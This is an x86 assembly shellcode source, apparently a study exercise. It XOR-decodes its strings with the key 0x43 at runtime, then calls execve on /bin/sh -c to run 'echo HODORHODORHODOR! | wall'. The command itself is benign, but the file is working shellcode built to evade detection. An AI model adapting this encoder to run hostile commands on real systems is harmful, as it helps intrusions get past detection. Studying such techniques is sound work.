global _start
section .text

; execve("/bin//sh", ["/bin//sh", "-c", "echo HODORHODORHODOR! | wall"], [/* 0 vars */])
_start:
	; sys_execve 0x0b
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	push   0xb			; sys_execve call 0x0b
	pop    eax			; Put into EAX
	cdq    				; Put 0 into EDX using the signed bit from EAX

	; String reference jmp/call/pop
	jmp arg2			; Jump to second argument string

decoder:
	pop edi				; Pop the address on stack after return from function into EDI
	xor ecx, ecx			; Clear reg for counting

decode:
	xor byte [edi], 0x43		; XOR the current byte with a value
	jz continue			; If end of string is detected, jump to continue
	inc ecx				; Increase counter
	inc edi				; Go to next character
	jmp short decode		; Repeat function

continue:
	sub edi, ecx			; Realign position of string, decremented by used counter
	cmp cx, lenarg2-1		; Check if second argument equals to length of counter, minus 1 for string termination
	jne append1			; If equal, jump to second argument section

append2:
	mov esi, edi			; Move XOR decoded string in ESI for second argument
	
	; '/bin/sh'
	jmp arg1			; Jump to first argument string

append1:
	mov ebx, edi			; Move XOR decoded string in EBX for first argument

	; '-c'
	push   edx			; Terminate string with NULL
	push word  0x632d		; '-c'
	mov    ecx,esp			; Put reference for string pointing by stackpointer, into ECX

	; Push registers
	push   edx			; Terminate string with NULL
	push   esi			; Push second argument
	push   ecx			; Push '-c' string
	push   ebx			; Push first argument '/bin/sh' string
	mov    ecx,esp			; Put reference to all strings into ECX, pointed by stackpointer
	int    0x80			; syscall

arg2:
	call decoder			; Go to decoder
	
	; Original string and hex encoded string
	; argstr2: db "echo HODORHODORHODOR! | wall", 0
	; argstr2: db 0x65, 0x63, 0x68, 0x6f, 0x20, 0x48, 0x4f, 0x44, 0x4f, 0x52, 0x48, 0x4f, 0x44, 0x4f, 0x52, 0x48, 0x4f, 0x44, 0x4f, 0x52, 0x21, 0x20, 0x7c, 0x20, 0x77, 0x61, 0x6c, 0x6c, 0
	
	; Generated from command:
	; python ../string_xor_asmhex.py "echo HODORHODORHODOR! | wall" C
	
	; String XOR encoded with byte 0x43, terminated with 0
	argstr2: db 0x26, 0x20, 0x2b, 0x2c, 0x63, 0xb, 0xc, 0x7, 0xc, 0x11, 0xb, 0xc, 0x7, 0xc, 0x11, 0xb, 0xc, 0x7, 0xc, 0x11, 0x62, 0x63, 0x3f, 0x63, 0x34, 0x22, 0x2f, 0x2f, 0x43
	lenarg2 equ $-argstr2		; Variable for stringlength

arg1: 
	call decoder			; Go to decoder
	argstr1: db 0x6c, 0x21, 0x2a, 0x2d, 0x6c, 0x30, 0x2b, 0x43
	lenarg1 equ $-argstr1		; Variable for stringlength

